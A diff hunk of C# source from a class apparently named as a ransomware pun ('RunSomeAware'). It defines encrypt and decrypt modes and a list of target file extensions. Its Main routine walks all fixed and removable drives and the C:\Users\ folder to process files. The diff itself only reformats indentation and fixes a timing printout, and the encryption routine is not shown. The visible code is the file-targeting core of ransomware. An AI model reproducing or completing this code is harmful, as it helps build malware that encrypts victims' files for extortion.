@@ -12,26 +12,26 @@ class RunSomeAware
     public static string[] AllowedExt = { ".png", ".html", ".7z", ".cpp", ".js", ".txt", CrypterExt };
     public static Mode mode = Mode.Encrypt;
     public enum Mode 
-	{
-		Encrypt=1,
-		Decrypt=0 
-	};
+    {
+    	Encrypt=1,
+    	Decrypt=0 
+    };
     public static void Main()
     {
-		Stopwatch watch = Stopwatch.StartNew();
+	Stopwatch watch = Stopwatch.StartNew();
         foreach (DriveInfo drive in DriveInfo.GetDrives())
         {
             if(drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable)
-			{
-				if(!drive.Name.StartsWith("C:\\"))
-				{
-				    Start(drive.Name); 
-				}
-			}
+	    {
+	    	if(!drive.Name.StartsWith("C:\\"))
+	    	{
+	    	    Start(drive.Name); 
+	    	}
+	    }
         }   
-		Start(@"C:\Users\");		
+	Start(@"C:\Users\");		
         watch.Stop();
-        Console.WriteLine("Time:" + (watch.ElapsedMilliseconds * 0.001 * 1024 * 1024) + " s");
+        Console.WriteLine("Time:" + (watch.ElapsedMilliseconds * 0.001) + " s");
     }
     static void Start(string ParentDir)
     {
